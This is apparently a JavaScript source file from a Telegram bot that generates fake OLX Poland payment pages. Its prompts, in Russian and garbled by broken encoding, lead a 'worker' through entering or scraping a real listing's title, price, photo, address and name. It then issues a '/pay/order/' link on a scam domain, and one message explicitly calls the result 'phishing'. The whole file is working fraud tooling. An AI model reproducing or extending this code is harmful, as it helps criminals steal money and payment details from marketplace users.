const { Markup } = require("telegraf");
const WizardScene = require("telegraf/scenes/wizard");

const { items, services, countries } = require("../../../../../database/index");

const parser = require("../../../../functions/createParser");
const getCurCode = require("../../../../functions/getCurCode");

function genId() {
  var result = "";
  var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
  var charactersLength = characters.length;
  for (var i = 0; i < 8; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}

module.exports = new WizardScene(
  "create_olx2_pl",
  async (ctx) => {
    try {
      ctx.wizard.state.service = ctx.match[1];

      await ctx
        .editMessageText("üáµüá± <b>–í—ã–±–µ—Ä–∏—Ç–µ —Ç–∏–ø —Å–æ–∑–¥–∞–Ω–∏—è —Å—Å—ã–ª–∫–∏</b>", {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.callbackButton("üñäÔ∏è –†—É—á–Ω–æ–π", "main"),
              Markup.callbackButton("ü§ñ –ü–∞—Ä—Å–µ—Ä", "parser"),
            ],
            [Markup.callbackButton("< –û—Ç–º–µ–Ω–∏—Ç—å", "cancel")],
          ]),
        })
        .catch((err) => err);

      return ctx.wizard.next();
    } catch (err) {
      console.log(err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      ctx.wizard.state.type = ctx.update.callback_query.data;

      if (ctx.update.callback_query.data == "main") {
        const msg = await ctx
          .editMessageText("üáµüá± –í–≤–µ–¥–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ —Ç–æ–≤–∞—Ä–∞", {
            reply_markup: Markup.inlineKeyboard([
              [Markup.callbackButton("< –û—Ç–º–µ–Ω–∏—Ç—å", "cancel")],
            ]),
          })
          .catch((err) => err);

        ctx.wizard.state.msgId = msg.message_id;
      } else {
        const msg = await ctx
          .editMessageText("üáµüá± –í–≤–µ–¥–∏—Ç–µ —Å—Å—ã–ª–∫—É –Ω–∞ —Ç–æ–≤–∞—Ä", {
            reply_markup: Markup.inlineKeyboard([
              [Markup.callbackButton("< –û—Ç–º–µ–Ω–∏—Ç—å", "cancel")],
            ]),
          })
          .catch((err) => err);

        ctx.wizard.state.msgId = msg.message_id;
      }

      return ctx.wizard.next();
    } catch (err) {
      console.log(err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      await ctx.deleteMessage().catch((err) => err);
      await ctx.deleteMessage(ctx.wizard.state.msgId).catch((err) => err);

      if (ctx.wizard.state.type == "main") {
        ctx.wizard.state.title = ctx.message.text;

        const msg = await ctx
          .replyWithHTML("üáµüá± –í–≤–µ–¥–∏—Ç–µ —Å—Ç–æ–∏–º–æ—Å—Ç—å —Ç–æ–≤–∞—Ä–∞ (—Ç–æ–ª—å–∫–æ —á–∏—Å–ª–æ)", {
            reply_markup: Markup.inlineKeyboard([
              [Markup.callbackButton("< –û—Ç–º–µ–Ω–∏—Ç—å", "cancel")],
            ]),
          })
          .catch((err) => err);

        ctx.wizard.state.msgId = msg.message_id;
        return ctx.wizard.next();
      } else {
        let url;
        try {
          url = new URL(ctx.message.text);
        } catch (err) {
          await ctx
            .replyWithHTML("‚ùå –í–≤–µ–¥–∏—Ç–µ –≤–∞–ª–∏–¥–Ω—É—é —Å—Å—ã–ª–∫—É")
            .catch((err) => err);
          return ctx.wizard.prevStep();
        }
        if (url.host == "m.olx.pl") {
          url.host = "www.olx.pl";
        }

        const service = await services.findOne({
          where: {
            code: ctx.wizard.state.service,
          },
        });

        const country = await countries.findOne({
          where: {
            code: service.country,
          },
        });

        const info = await parser(ctx.wizard.state.service, ctx.message.text);

        const item = await items.create({
          id: genId(),
          workerId: ctx.from.id,
          title: info.title,
          photo: info.photo,
          price: parseInt(info.price.replace(/\s/g, "")).toFixed(2),
          currency: service.currency,
          serviceCode: service.code,
          status: service.status,
        });

        const msg= await ctx
          .replyWithPhoto(
            { url: info.photo },
            {
              caption: `<b>üëª –°—Å—ã–ª–∫–∞ —Å–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–∞!
            
üè¥ –°–µ—Ä–≤–∏—Å: ${service.title.replace(/[^a-zA-Z]+/g, "")} ${service.status}.0

‚ñ™Ô∏è ID –æ–±—ä—è–≤–ª–µ–Ω–∏—è: #${item.id}
‚ñ™Ô∏è –ù–∞–∑–≤–∞–Ω–∏–µ: ${info.title}
‚ñ™Ô∏è –°—Ç–æ–∏–º–æ—Å—Ç—å: ${info.price}</b>

‚úîÔ∏è –î–æ–º–µ–Ω –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –ø—Ä–æ–≤–µ—Ä–µ–Ω.`,
              parse_mode: "HTML",
              reply_markup: Markup.inlineKeyboard([
                [
                  Markup.urlButton(
                    "üîó –ü–µ—Ä–µ–π—Ç–∏",
                    `https://${service.domain}/pay/order/${item.id}`
                  ),
                ],
                [
                  Markup.callbackButton("üñäÔ∏è –¶–µ–Ω–∞", `changePrice_${item.id}`),
                  // Markup.callbackButton("üì± SMS", `sendSms`),
                ],
                [Markup.callbackButton("< –í –º–µ–Ω—é", `menu`)],
              ]),
            }
          )
          .catch((err) => err);

          await item.update({
            msgId: msg.message_id,
          });

        return ctx.scene.leave();
      }
    } catch (err) {
      console.log(err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      await ctx.deleteMessage().catch((err) => err);
      await ctx.deleteMessage(ctx.wizard.state.msgId).catch((err) => err);

      ctx.wizard.state.price = parseFloat(ctx.message.text);

      if (isNaN(parseFloat(ctx.message.text))) {
        await ctx
          .replyWithHTML("‚ùóÔ∏è –í—ã –≤–≤–µ–ª–∏ –Ω–µ —á–∏—Å–ª–æ, —Å–æ–∑–¥–∞–Ω–∏–µ —Å—Å—ã–ª–∫–∏ –æ—Ç–º–µ–Ω–µ–Ω–æ", {
            reply_markup: Markup.inlineKeyboard([
              [Markup.callbackButton("< –í –º–µ–Ω—é", "menu")],
            ]),
          })
          .catch((err) => err);

        return ctx.scene.leave();
      } else {
        const msg = await ctx
          .replyWithHTML(
            "üáµüá± –í–≤–µ–¥–∏—Ç–µ —Å—Å—ã–ª–∫—É –Ω–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ (–∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ @imgur_linkbot)",
            {
              reply_markup: Markup.inlineKeyboard([
                [Markup.callbackButton("< –û—Ç–º–µ–Ω–∏—Ç—å", "cancel")],
              ]),
            }
          )
          .catch((err) => err);

        ctx.wizard.state.msgId = msg.message_id;
      }

      return ctx.wizard.next();
    } catch (err) {
      console.log(err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      ctx.wizard.state.photo = ctx.message.text;

      await ctx.deleteMessage().catch((err) => err);
      await ctx.deleteMessage(ctx.wizard.state.msgId).catch((err) => err);

      try {
        url = new URL(ctx.message.text);
      } catch (err) {
        await ctx
          .replyWithHTML(
            "‚ùóÔ∏è –í—ã –æ—Ç–ø—Ä–∞–≤–∏–ª–∏ –Ω–µ —Å—Å—ã–ª–∫—É, —Å–æ–∑–¥–∞–Ω–∏–µ —Ñ–∏—à–∏–Ω–≥–∞ –æ—Ç–º–µ–Ω–µ–Ω–æ",
            {
              reply_markup: Markup.inlineKeyboard([
                [Markup.callbackButton("< –í –º–µ–Ω—é", "menu")],
              ]),
            }
          )
          .catch((err) => err);
        return ctx.scene.leave();
      }

      const msg = await ctx
        .replyWithHTML("üáµüá± –í–≤–µ–¥–∏—Ç–µ –∞–¥—Ä–µ—Å –¥–æ—Å—Ç–∞–≤–∫–∏", {
          reply_markup: Markup.inlineKeyboard([
            ...(ctx.state.user.address == null
              ? []
              : [
                  [
                    Markup.callbackButton(
                      ctx.state.user.address,
                      ctx.state.user.address
                    ),
                  ],
                ]),
            [Markup.callbackButton("< –û—Ç–º–µ–Ω–∏—Ç—å", "cancel")],
          ]),
        })
        .catch((err) => err);

      ctx.wizard.state.msgId = msg.message_id;

      return ctx.wizard.next();
    } catch (err) {
      console.log(err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (!ctx.update.callback_query) {
        ctx.wizard.state.deliveryAddress = ctx.message.text;
        await ctx.state.user.update({
          address: ctx.message.text,
        });
      } else ctx.wizard.state.deliveryAddress = ctx.update.callback_query.data;

      await ctx.deleteMessage().catch((err) => err);
      await ctx.deleteMessage(ctx.wizard.state.msgId).catch((err) => err);

      const msg = await ctx
        .replyWithHTML(
          "üáµüá± –í–≤–µ–¥–∏ —Ñ–∞–º–∏–ª–∏—é –∏ –∏–º—è –ø–æ–ª—É—á–∞—Ç–µ–ª—è (–ü—Ä–∏–º–µ—Ä: –ò–≤–∞–Ω–æ–≤ –ò–≤–∞–Ω)",
          {
            reply_markup: Markup.inlineKeyboard([
              ...(ctx.state.user.name == null
                ? []
                : [
                    [
                      Markup.callbackButton(
                        ctx.state.user.name,
                        ctx.state.user.name
                      ),
                    ],
                  ]),
              [Markup.callbackButton("< –û—Ç–º–µ–Ω–∏—Ç—å", "cancel")],
            ]),
          }
        )
        .catch((err) => err);

      ctx.wizard.state.msgId = msg.message_id;

      return ctx.wizard.next();
    } catch (err) {
      console.log(err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (!ctx.update.callback_query) {
        ctx.wizard.state.name = ctx.message.text;
        await ctx.state.user.update({
          name: ctx.message.text,
        });
      } else ctx.wizard.state.name = ctx.update.callback_query.data;

      await ctx.deleteMessage().catch((err) => err);
      await ctx.deleteMessage(ctx.wizard.state.msgId).catch((err) => err);

      const service = await services.findOne({
        where: {
          code: ctx.wizard.state.service,
        },
      });

      const country = await countries.findOne({
        where: {
          code: service.country,
        },
      });

      const item = await items.create({
        id: genId(),
        workerId: ctx.from.id,
        title: ctx.wizard.state.title,
        photo: ctx.wizard.state.photo,
        price: ctx.wizard.state.price.toFixed(2),
        address: ctx.wizard.state.deliveryAddress,
        name: ctx.wizard.state.name,
        currency: service.currency,
        serviceCode: service.code,
        status: service.status,
      });

      try {
        const msg = await ctx.replyWithPhoto(
          { url: ctx.wizard.state.photo },
          {
            caption: `<b>üëª –°—Å—ã–ª–∫–∞ —Å–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–∞!
            
üè¥ –°–µ—Ä–≤–∏—Å: ${service.title.replace(/[^a-zA-Z]+/g, "")} ${service.status}.0

‚ñ™Ô∏è ID –æ–±—ä—è–≤–ª–µ–Ω–∏—è: #${item.id}
‚ñ™Ô∏è –ù–∞–∑–≤–∞–Ω–∏–µ:${ctx.wizard.state.title}
‚ñ™Ô∏è –°—Ç–æ–∏–º–æ—Å—Ç—å: ${await getCurCode(service.currency)} ${parseInt(
  item.price
).toFixed(2)}</b>

‚úîÔ∏è –î–æ–º–µ–Ω –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –ø—Ä–æ–≤–µ—Ä–µ–Ω.`,
            parse_mode: "HTML",
            reply_markup: Markup.inlineKeyboard([
              [
                Markup.urlButton(
                  "üîó –ü–µ—Ä–µ–π—Ç–∏",
                  `https://${service.domain}/pay/order/${item.id}`
                ),
              ],
              [Markup.callbackButton("üñäÔ∏è –¶–µ–Ω–∞", `changePrice_${item.id}`)],
              [Markup.callbackButton("< –í –º–µ–Ω—é", `menu`)],
            ]),
          }
        );
        await item.update({
          msgId: msg.message_id,
        });
      } catch (err) {
        const msg = await ctx.replyWithPhoto(
          { url: "https://i.imgur.com/RLDAtaZ.jpeg" },
          {
            caption: `<b>üëª –°—Å—ã–ª–∫–∞ —Å–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–∞!
            
üè¥ –°–µ—Ä–≤–∏—Å: ${service.title.replace(/[^a-zA-Z]+/g, "")} ${service.status}.0

‚ñ™Ô∏è ID –æ–±—ä—è–≤–ª–µ–Ω–∏—è: #${item.id}
‚ñ™Ô∏è –ù–∞–∑–≤–∞–Ω–∏–µ:${ctx.wizard.state.title}
‚ñ™Ô∏è –°—Ç–æ–∏–º–æ—Å—Ç—å: ${await getCurCode(service.currency)} ${parseInt(
  item.price
).toFixed(2)}</b>

‚úîÔ∏è –î–æ–º–µ–Ω –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –ø—Ä–æ–≤–µ—Ä–µ–Ω.`,
            parse_mode: "HTML",
            reply_markup: Markup.inlineKeyboard([
              [
                Markup.urlButton(
                  "üîó –ü–µ—Ä–µ–π—Ç–∏",
                  `https://${service.domain}/pay/order/${item.id}`
                ),
              ],
              [Markup.callbackButton("üñäÔ∏è –¶–µ–Ω–∞", `changePrice_${item.id}`)],
              [Markup.callbackButton("< –í –º–µ–Ω—é", `menu`)],
            ]),
          }
        );
        await item.update({
          msgId: msg.message_id,
        });
      }

      return ctx.scene.leave();
    } catch (err) {
      console.log(err);
      return ctx.scene.leave();
    }
  }
);